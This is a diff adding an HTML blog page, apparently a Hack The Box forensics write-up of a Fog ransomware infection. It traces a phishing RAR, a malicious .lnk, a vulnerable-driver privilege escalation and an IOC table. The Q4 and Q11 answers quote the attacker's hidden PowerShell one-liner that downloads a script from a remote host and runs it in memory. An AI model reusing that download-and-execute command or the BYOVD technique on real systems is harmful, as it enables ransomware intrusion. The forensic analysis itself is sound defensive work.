@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FogRansomware Write-up | Joan Dimas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <style>
+    .question-box {
+      margin: 1rem 0 1.5rem;
+      padding: 1rem 1.25rem;
+      background: rgba(245, 194, 107, 0.08);
+      border-left: 4px solid var(--accent);
+      border-radius: 12px;
+    }
+
+    .question-box p {
+      color: #ffffff;
+      margin: 0;
+    }
+
+    .answer-block {
+      padding: 0.25rem 0 0.5rem;
+    }
+
+    .task {
+      margin-bottom: 3rem;
+    }
+
+    .task h3 {
+      color: var(--accent);
+    }
+  </style>
+</head>
+
+<body class="project-page">
+
+<div class="argus-page">
+
+  <!-- Header -->
+  <header class="argus-header">
+    <h1>FogRansomware Write-up</h1>
+    <a class="back-link" href="../index.html">← Back to HTB Writeups</a>
+  </header>
+
+  <!-- Main Content -->
+  <main class="argus-content">
+
+    <h2>Scenario:</h2>
+<p>On April 30, 2025, a Finance department user received a phishing email with a RAR file. Trusting the sender, the user extracted and opened it. GOAT Capital’s SOC detected suspicious PowerShell activity from the user’s workstation. Soon after, mass file deletions and changes occurred, followed by ransom notes demanding Monero. Your task: investigate the true attack vector, identify attacker techniques, and assess the scope of the compromise.</p>
+
+    <hr class="section-divider">
+
+    <!-- Q1 -->
+    <div class="task">
+      <h3>Q1:</h3>
+
+      <div class="question-box">
+        <p>To trace the origin of the attack, it's essential to identify where the malicious file was obtained. What is the complete URL from which the user downloaded the malicious RAR file?</p>
+      </div>
+
+      <div class="answer-block">
+<p>To identify the complete URL used to download the malicious RAR file, I navigated to the administrator's Microsoft Edge <code>History</code> database and opened it using <code>DB Browser for SQLite</code>.</p>
+
+<p>Within the database, I first reviewed the <code>Downloads</code> table, where I identified the downloaded RAR file:</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/1.png" alt="FogRansomware Image 1">
+  <figcaption></figcaption>
+</figure>
+
+<p>This confirmed that the malicious file was named:</p>
+
+<pre><code>pay rate.pdf.rar
+</code></pre>
+
+<p>With the filename identified, I then pivoted to the <code>urls</code> table to determine the source from which the file was downloaded. The associated entry revealed the complete download URL:</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/2.png" alt="FogRansomware Image 2">
+  <figcaption></figcaption>
+</figure>
+
+<p>The malicious RAR file was downloaded from:</p>
+
+<pre><code>https://limewire.com/d/lihUt#NrUgowrb29
+</code></pre>
+      </div>
+    </div>
+    <!-- Q2 -->
+    <div class="task">
+      <h3>Q2:</h3>
+
+      <div class="question-box">
+        <p>Establishing an exact timeline helps reconstruct the attack sequence accurately. What is the exact timestamp when the user downloaded the RAR file to the system? (in 24H format)</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this one, We see the time-stamp in image 1 on the first question. To get the UTC time-stamp, we simply got to convert:</p>
+
+<p>For this question, the download timestamp can be seen in <strong>Image 1 from Q1</strong>, within the Microsoft Edge <code>History</code> database.</p>
+
+<p>The recorded timestamp was:</p>
+
+<pre><code>13390518525729026
+</code></pre>
+
+<p>Because Microsoft Edge stores these timestamps using the Chromium/WebKit timestamp format, I converted the value to UTC.</p>
+
+<p>After conversion, the RAR file was downloaded at:</p>
+
+<pre><code>2025-04-30 20:28
+</code></pre>
+      </div>
+    </div>
+    <!-- Q3 -->
+    <div class="task">
+      <h3>Q3:</h3>
+
+      <div class="question-box">
+        <p>Understanding how the payload was executed reveals the user action that led to compromise. Which file extracted from the archive was launched by the user, triggering the attack?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I initially searched for suspicious file creation activity around the time of the download using the <code>MFT</code>, <code>USN Journal</code>, and Windows Event Logs. However, I was unable to identify anything conclusive through those artifacts.</p>
+
+<p>I then pivoted to determine which files the user may have manually launched. To do this, I loaded the user's <code>NTUSER.dat</code> hive into <code>Registry Explorer</code> and examined the <code>UserAssist</code> key.</p>
+
+<p>The <code>UserAssist</code> key is useful because it records GUI-based program execution and can help identify files or applications that a user manually opened.</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/3.png" alt="FogRansomware Image 3">
+  <figcaption></figcaption>
+</figure>
+
+<p>At the bottom of the results, we can see that the user launched:</p>
+
+<pre><code>pay rate.pdf.lnk
+</code></pre>
+
+<p>This indicates that <code>pay rate.pdf.lnk</code>, extracted from the archive, was the file executed by the user and ultimately triggered the attack.</p>
+      </div>
+    </div>
+    <!-- Q4 -->
+    <div class="task">
+      <h3>Q4:</h3>
+
+      <div class="question-box">
+        <p>Identifying the initial script clarifies the method used to deliver and execute malicious payloads. What is the name of the PowerShell script that executed the payloads?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I focused on identifying any PowerShell scripts that may have been introduced and executed on the system. Fortunately, while analyzing process creation events for Q3, I came across the command used to retrieve the malicious PowerShell payload.</p>
+
+<p>The following command was observed:</p>
+
+<pre><code>&quot;C:\Windows\System32\cmd.exe&quot; /c start &quot;&quot; /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command &quot;iwr -uri &#x27;http://192[.]168[.]1.54:4561/troubleshooting.ps1&#x27; -UseBasicParsing | IEX&quot;
+</code></pre>
+
+<p>This command reveals several important details. PowerShell was launched with a hidden window, profiles disabled, and the execution policy bypassed. The <code>iwr</code> (<code>Invoke-WebRequest</code>) command was then used to retrieve:</p>
+
+<pre><code>troubleshooting.ps1
+</code></pre>
+
+<p>The downloaded script was piped directly into <code>IEX</code> (<code>Invoke-Expression</code>), meaning it was executed directly in memory rather than first being saved to disk.</p>
+
+<p>This activity occurred at:</p>
+
+<pre><code>2025-04-30 20:32:06
+</code></pre>
+
+<p>This was approximately four minutes after the initial malicious RAR file was downloaded, helping establish the progression from user download to payload execution.</p>
+
+<p>Therefore, the PowerShell script responsible for executing the payloads was:</p>
+
+<pre><code>troubleshooting.ps1
+</code></pre>
+      </div>
+    </div>
+    <!-- Q5 -->
+    <div class="task">
+      <h3>Q5:</h3>
+
+      <div class="question-box">
+        <p>Pinpointing when ransomware activity began is crucial for defining the start of encryption. When did the ransomware first execute on the victim machine?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I built directly from the previous finding. We already established that the malicious PowerShell payload was retrieved and executed at:</p>
+
+<pre><code>2025-04-30 20:32:06
+</code></pre>
+
+<p>From there, I pivoted to the <code>USN Journal</code> to look for file creation activity occurring around that same timeframe. Almost immediately, I identified the creation of the following ransom note on the Administrator's Desktop:</p>
+
+<pre><code>RANSOMNOTE.txt
+</code></pre>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/4.png" alt="FogRansomware Image 4">
+  <figcaption></figcaption>
+</figure>
+
+<p>The creation of <code>RANSOMNOTE.txt</code> within the same minute as the PowerShell execution strongly indicates that the ransomware payload had begun executing at approximately:</p>
+
+<pre><code>2025-04-30 20:32
+</code></pre>
+
+<p>I also observed files with the <code>.FLOCK</code> extension being created during the same minute, further supporting that file encryption activity had already begun.</p>
+
+<p>Therefore, the ransomware first executed on the victim system at approximately:</p>
+
+<pre><code>2025-04-30 20:32
+</code></pre>
+      </div>
+    </div>
+    <!-- Q6 -->
+    <div class="task">
+      <h3>Q6:</h3>
+
+      <div class="question-box">
+        <p>Hash values allow correlation of the malware across systems and threat intelligence sources. What is the SHA256 hash of the ransomware executable used in this attack?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I analyzed <code>Sysmon</code> process creation events to identify the executable responsible for the ransomware activity.</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/5.png" alt="FogRansomware Image 5">
+  <figcaption></figcaption>
+</figure>
+
+<p>Starting from the beginning of the execution chain, we can first see the PowerShell command responsible for downloading and executing <code>troubleshooting.ps1</code>.</p>
+
+<p>Shortly afterward, PowerShell launches the following executable:</p>
+
+<pre><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hidden\Adobe Acrobat.exe
+</code></pre>
+
+<p>Despite its name, this executable is highly suspicious. Legitimate Adobe Acrobat binaries would not normally execute from a hidden directory beneath the Windows <code>Startup</code> folder.</p>
+
+<p>Additional activity further supports this conclusion. The following command was used against the directory:</p>
+
+<pre><code>attrib.exe +H +S &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hidden&quot;
+</code></pre>
+
+<p>The flags apply the following attributes:</p>
+
+<ul>
+  <li><code>+H</code> - Hidden</li>
+  <li><code>+S</code> - System</li>
+</ul>
+
+<p>This suggests the attacker intentionally attempted to conceal the directory containing the malicious executable while also placing it within a location associated with persistence.</p>
+
+<p>The suspicious <code>Adobe Acrobat.exe</code> process then spawned <code>cmd.exe</code> and performed several system-discovery commands, including:</p>
+
+<pre><code>net config Workstation
+systeminfo
+hostname
+</code></pre>
+
+<p>Most importantly, the same executable was responsible for launching the ransom note:</p>
+
+<pre><code>C:\Windows\System32\NOTEPAD.EXE &quot;C:\Users\Administrator\Desktop\RANSOMNOTE.txt&quot;
+</code></pre>
+
+<p>The parent process of <code>NOTEPAD.EXE</code> was:</p>
+
+<pre><code>Adobe Acrobat.exe
+</code></pre>
+
+<p>This provides strong evidence that the fraudulent <code>Adobe Acrobat.exe</code> executable was the binary payload responsible for the malicious activity.</p>
+
+<p>From the corresponding Sysmon process creation event, I then extracted the <code>SHA256</code> value recorded in the <code>Hashes</code> field.</p>
+
+<p>The ransomware executable was:</p>
+
+<pre><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hidden\Adobe Acrobat.exe
+</code></pre>
+
+<p>Its SHA256 hash was: <code>113A06C8BA6069D345F3C3DB89051553D8AFF7D27408945B50AA94256277DCB3</code></p>
+      </div>
+    </div>
+    <!-- Q7 -->
+    <div class="task">
+      <h3>Q7:</h3>
+
+      <div class="question-box">
+        <p>Knowing how persistence was maintained helps ensure thorough malware removal. What MITRE ATT&amp;CK sub-technique ID did the attacker use to gain persistence post-reboot?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, we can build directly from the activity identified in Q6.</p>
+
+<p>The malicious executable was placed under the Windows <code>Startup</code> folder:</p>
+
+<pre><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hidden\Adobe Acrobat.exe
+</code></pre>
+
+<p>Files placed within the Windows Startup folder can automatically execute when a user logs on, allowing the malware to regain execution after a system reboot.</p>
+
+<p>This persistence mechanism maps to the MITRE ATT&amp;CK sub-technique:</p>
+
+<pre><code>T1547.001
+</code></pre>
+
+<p><strong>T1547.001 - Registry Run Keys / Startup Folder</strong></p>
+      </div>
+    </div>
+    <!-- Q8 -->
+    <div class="task">
+      <h3>Q8:</h3>
+
+      <div class="question-box">
+        <p>Exploited drivers often reveal the attacker’s method for gaining elevated privileges. What is the name of the vulnerable driver the attacker used for privilege escalation?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I continued analyzing process creation events and identified several commands executed between:</p>
+
+<pre><code>2025-04-30 20:32
+
+2025-04-30 20:34
+</code></pre>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/6.png" alt="FogRansomware Image 6">
+  <figcaption></figcaption>
+</figure>
+
+<p>The commands show that the attacker was actively performing system enumeration. One command that stood out was:</p>
+
+<pre><code>cmd.exe /c DRIVERQUERY
+</code></pre>
+
+<p>Because <code>DRIVERQUERY</code> enumerates installed drivers, I pivoted to determine whether the attacker subsequently introduced or exploited a vulnerable driver.</p>
+
+<p>I first reviewed <code>Sysmon Event ID 6</code>, which records driver load activity, but did not identify anything conclusive. I then pivoted to <strong>Windows System Event ID 7045 - Service Installed</strong>, since kernel drivers can also be registered with the Windows Service Control Manager as services.</p>
+
+<p>This revealed the following event at:</p>
+
+<pre><code>2025-04-30 20:32:36
+</code></pre>
+
+<pre><code>{&quot;EventData&quot;:{&quot;Data&quot;:[{&quot;@Name&quot;:&quot;ServiceName&quot;,&quot;#text&quot;:&quot;int&quot;},{&quot;@Name&quot;:&quot;ImagePath&quot;,&quot;#text&quot;:&quot;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\iqvw64e.sys&quot;},{&quot;@Name&quot;:&quot;ServiceType&quot;,&quot;#text&quot;:&quot;kernel mode driver&quot;},{&quot;@Name&quot;:&quot;StartType&quot;,&quot;#text&quot;:&quot;demand start&quot;},{&quot;@Name&quot;:&quot;AccountName&quot;}]}}
+</code></pre>
+
+<p>The important fields were:</p>
+
+<pre><code>ServiceName: int
+ImagePath: C:\Users\ADMINI~1\AppData\Local\Temp\iqvw64e.sys
+ServiceType: kernel mode driver
+StartType: demand start
+</code></pre>
+
+<p>Event ID 7045 shows that Windows registered a new service named <code>int</code> whose backing binary was:</p>
+
+<pre><code>C:\Users\ADMINI~1\AppData\Local\Temp\iqvw64e.sys
+</code></pre>
+
+<p>The <code>ServiceType</code> explicitly identifies it as a <strong>kernel-mode driver</strong>, while <code>StartType: demand start</code> indicates that the driver would only be loaded when explicitly requested.</p>
+
+<p>In other words, the attacker registered <code>iqvw64e.sys</code> with the Service Control Manager so it could be loaded into the Windows kernel when needed.</p>
+      </div>
+    </div>
+    <!-- Q9 -->
+    <div class="task">
+      <h3>Q9:</h3>
+
+      <div class="question-box">
+        <p>Mapping kernel-level techniques helps identify sophisticated system access methods. What technique did the attacker use to gain kernel-level access?</p>
+      </div>
+
+      <div class="answer-block">
+<pre><code>Bring Your Own Vulnerable Driver (BYOVD)
+</code></pre>
+
+<p>The attacker installed the vulnerable <code>iqvw64e.sys</code> kernel driver and abused it to obtain <strong>kernel-level access</strong>.</p>
+      </div>
+    </div>
+    <!-- Q10 -->
+    <div class="task">
+      <h3>Q10:</h3>
+
+      <div class="question-box">
+        <p>Tracking files written by malware provides insight into its actions and scope. What is the name of the log file created by the ransomware to record its operations?</p>
+      </div>
+
+      <div class="answer-block">
+<p>To identify the log file created by the ransomware, I analyzed <code>Sysmon Event ID 11</code>, which records file creation activity.</p>
+
+<p>I then narrowed the results to only files created by the malicious <code>Adobe Acrobat.exe</code> process identified in the previous questions.</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/7.png" alt="FogRansomware Image 7">
+  <figcaption></figcaption>
+</figure>
+
+<p>Within the resulting file creation events, I identified the following file being created at:</p>
+
+<pre><code>2025-04-30 20:32:34
+</code></pre>
+
+<pre><code>DbgLog.sys
+</code></pre>
+
+<p>Because this file was created directly by the ransomware process, it corresponds to the log file used by the malware to record its operations.</p>
+      </div>
+    </div>
+    <!-- Q11 -->
+    <div class="task">
+      <h3>Q11:</h3>
+
+      <div class="question-box">
+        <p>Command-and-control contact details help trace external infrastructure used in the attack. What IP address and port number did the downloader connect to in order to retrieve the payload?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this question, I referenced the PowerShell command identified earlier in the investigation, which was used to retrieve the malicious <code>troubleshooting.ps1</code> payload:</p>
+
+<pre><code>iwr -uri &#x27;http://192[.]168[.]1[.]54:4561/troubleshooting.ps1&#x27; -UseBasicParsing | IEX
+</code></pre>
+
+<p>This command shows that the downloader connected directly to the following IP address and port to retrieve the payload:</p>
+
+<pre><code>192[.]168[.]1[.]54:4561
+</code></pre>
+      </div>
+    </div>
+    <!-- Q12 -->
+    <div class="task">
+      <h3>Q12:</h3>
+
+      <div class="question-box">
+        <p>Understanding encryption behavior is vital for response and recovery planning. What file extension did the ransomware append to encrypted files?</p>
+      </div>
+
+      <div class="answer-block">
+<p>To identify the extension used by the ransomware, I analyzed file activity within the <code>MFT</code> around the time the ransomware payload executed.</p>
+
+<p>During this review, I observed multiple files being created or renamed with the following extension appended:</p>
+
+<figure class="image-block">
+  <img src="../assets/images/fogransomware/8.png" alt="FogRansomware Image 8">
+  <figcaption></figcaption>
+</figure>
+
+<pre><code>flocked
+</code></pre>
+
+<p>The appearance of this extension across affected files during the ransomware execution window indicates that it was the extension applied to encrypted files.</p>
+      </div>
+    </div>
+    <!-- Q13 -->
+    <div class="task">
+      <h3>Q13:</h3>
+
+      <div class="question-box">
+        <p>Ransom communication links are key for attribution and negotiation strategy. What is the .onion link provided by the attacker for ransom payment or communication?</p>
+      </div>
+
+      <div class="answer-block">
+<p>For this final question, I submitted the ransomware sample to <code>tria.ge</code> for additional behavioral analysis.</p>
+
+<p>Within the sandbox results, I identified the <code>.onion</code> address embedded or referenced by the ransomware for victim communication and ransom payment.</p>
+
+<p>The onion address provided by the attacker was:</p>
+
+<pre><code>xql56zevsy7njcngsapchc2erzjfecwotdkobn3m4uxu2gtqh26newid.onion
+</code></pre>
+      </div>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- IOC TABLE -->
+    <div class="task">
+      <h3>Indicators of Compromise (IOC)</h3>
+
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>IOC Type</th>
+            <th>Indicator</th>
+            <th>Description</th>
+          </tr>
+        </thead>
+        <tbody>
+      <tr>
+        <td>Download URL</td>
+        <td><code>https://limewire.com/d/lihUt#NrUgowrb29</code></td>
+        <td>Complete URL used to download the malicious RAR file</td>
+      </tr>
+      <tr>
+        <td>Malicious Archive</td>
+        <td><code>pay rate.pdf.rar</code></td>
+        <td>RAR file downloaded by the user</td>
+      </tr>
+      <tr>
+        <td>Initial Execution File</td>
+        <td><code>pay rate.pdf.lnk</code></td>
+        <td>File extracted from the archive and launched by the user</td>
+      </tr>
+      <tr>
+        <td>PowerShell Script</td>
+        <td><code>troubleshooting.ps1</code></td>
+        <td>Malicious PowerShell script retrieved and executed in memory</td>
+      </tr>
+      <tr>
+        <td>Payload Server</td>
+        <td><code>192[.]168[.]1[.]54:4561</code></td>
+        <td>IP address and port used to retrieve troubleshooting.ps1</td>
+      </tr>
+      <tr>
+        <td>Ransomware Executable</td>
+        <td><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\hidden\Adobe Acrobat.exe</code></td>
+        <td>Malicious executable identified as the ransomware payload</td>
+      </tr>
+      <tr>
+        <td>SHA256</td>
+        <td><code>113A06C8BA6069D345F3C3DB89051553D8AFF7D27408945B50AA94256277DCB3</code></td>
+        <td>SHA256 hash of the ransomware executable</td>
+      </tr>
+      <tr>
+        <td>Vulnerable Driver</td>
+        <td><code>iqvw64e.sys</code></td>
+        <td>Kernel-mode driver registered by the attacker</td>
+      </tr>
+      <tr>
+        <td>Driver Path</td>
+        <td><code>C:\Users\ADMINI~1\AppData\Local\Temp\iqvw64e.sys</code></td>
+        <td>Path of the vulnerable kernel driver</td>
+      </tr>
+      <tr>
+        <td>Service Name</td>
+        <td><code>int</code></td>
+        <td>Service registered for the kernel-mode driver</td>
+      </tr>
+      <tr>
+        <td>Ransomware Log File</td>
+        <td><code>DbgLog.sys</code></td>
+        <td>Log file created by the ransomware</td>
+      </tr>
+      <tr>
+        <td>Ransom Note</td>
+        <td><code>RANSOMNOTE.txt</code></td>
+        <td>Ransom note created on the Administrator desktop</td>
+      </tr>
+      <tr>
+        <td>Encrypted File Extension</td>
+        <td><code>flocked</code></td>
+        <td>Extension appended to encrypted files</td>
+      </tr>
+      <tr>
+        <td>Onion Address</td>
+        <td><code>xql56zevsy7njcngsapchc2erzjfecwotdkobn3m4uxu2gtqh26newid.onion</code></td>
+        <td>Ransom communication/payment address</td>
+      </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="section-divider">
+
+    <!-- ATTACK TIMELINE -->
+    <div class="task">
+      <h3>Attack Timeline</h3>
+
+      <table class="ioc-table">
+        <thead>
+          <tr>
+            <th>Timestamp (UTC)</th>
+            <th>Activity</th>
+            <th>Details</th>
+          </tr>
+        </thead>
+        <tbody>
+      <tr>
+        <td><code>2025-04-30 20:28</code></td>
+        <td>Malicious archive downloaded</td>
+        <td>Microsoft Edge History records the download of <code>pay rate.pdf.rar</code> from the LimeWire URL.</td>
+      </tr>
+      <tr>
+        <td><code>2025-04-30 20:32:06</code></td>
+        <td>PowerShell payload retrieved and executed</td>
+        <td><code>cmd.exe</code> launches hidden PowerShell, which retrieves <code>troubleshooting.ps1</code> from <code>192[.]168[.]1[.]54:4561</code> and pipes it to <code>IEX</code>.</td>
+      </tr>
+      <tr>
+        <td><code>2025-04-30 20:32</code></td>
+        <td>Ransomware activity begins</td>
+        <td><code>RANSOMNOTE.txt</code> and files using the ransomware extension appear during the same minute as the malicious PowerShell execution.</td>
+      </tr>
+      <tr>
+        <td><code>2025-04-30 20:32:34</code></td>
+        <td>Ransomware log created</td>
+        <td><code>Adobe Acrobat.exe</code> creates <code>DbgLog.sys</code>.</td>
+      </tr>
+      <tr>
+        <td><code>2025-04-30 20:32:36</code></td>
+        <td>Vulnerable kernel driver registered</td>
+        <td>Windows Event ID 7045 records service <code>int</code> backed by <code>iqvw64e.sys</code> as a kernel-mode driver.</td>
+      </tr>
+      <tr>
+        <td><code>2025-04-30 20:32–20:34</code></td>
+        <td>System and driver discovery</td>
+        <td>The attacker performs system enumeration, including <code>DRIVERQUERY</code>, along with commands such as <code>net config Workstation</code>, <code>systeminfo</code>, and <code>hostname</code>.</td>
+      </tr>
+        </tbody>
+      </table>
+    </div>
+
+  </main>
+
+</div>
+
+</body>
+</html>
